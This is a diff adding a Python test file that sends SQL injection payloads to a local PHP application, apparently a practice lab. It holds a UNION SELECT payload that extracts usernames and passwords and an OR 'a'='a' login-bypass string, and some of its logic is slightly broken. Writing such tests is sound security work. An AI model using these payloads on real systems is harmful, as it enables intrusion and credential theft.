@@ -1,0 +1,54 @@
+
+def test_error_based_injection(base_url):
+    max=2
+    url= base_url+"/search_by_price.php?max={max}"
+    response = requests.get(url)
+    print(response.text)
+    try:
+        assert response.status_code == 200 and 'root@localhost' in response.text
+        print("Error-Based injection passed")
+    
+    except AssertionError:
+        print("Error-Based injection failed")
+    
+
+def test_union_based_injection(base_url):
+    max="1 UNION SELECT username, password FROM users-- -"
+    #search1="' UNION SELECT CONCAT(username, '~', password) FROM users-- -"
+    url= base_url+"/search_by_price.php?max=1 UNION SELECT username, password FROM users-- -"
+    response= requests.get(url)
+    print(response.text) 
+    try: 
+     assert response.status_code ==200 and "admin" in response.text
+     print("Union-Based test passed")
+    except AssertionError:
+        print("Union-Based injection failed")
+    #print(response.status_code) 
+
+
+
+
+
+
+
+
+#####for the login testing
+
+def test_error_injection():
+    url = "http://localhost:4000/sqli/login.php"
+    data = {
+        'user': 'admin--',
+        'pass': "password' OR 'a'='a"
+    }
+    response = requests.post(url, data=data)
+    if 'Wrong username or password' in response.text:
+        print('Error-based SQL injection test passed')
+    else:
+        print('Error-based SQL injection test failed')
+
+    #assert response.status_code == 500
+    #print (response.status_code)
+    print ("third response"+response.text)    
+
+
+    
